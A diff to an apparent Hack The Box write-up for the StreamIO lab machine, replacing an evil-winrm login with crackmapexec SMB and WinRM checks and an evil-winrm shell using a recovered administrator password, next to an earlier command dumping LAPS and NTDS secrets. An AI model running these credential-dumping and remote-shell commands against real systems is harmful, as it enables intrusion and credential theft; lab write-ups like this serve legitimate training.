@@ -315,6 +315,11 @@ crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d03dba37-db5c-47d9-8038-a0f160fd34fa)
 
 
-evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
-![image](https://user-images.githubusercontent.com/33616880/231689974-20ed5dca-92b5-43ec-b985-0d56bcfacec8.png)
-![image](https://user-images.githubusercontent.com/33616880/231690002-65764103-055f-4f93-8761-26278c100fcf.png)
+```
+crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
+crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
+evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/cfe6f588-336c-4e66-aed7-ddb09f10b1d1)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/2fc7ee06-1e7e-4434-ad07-5ecf7c8ddca3)
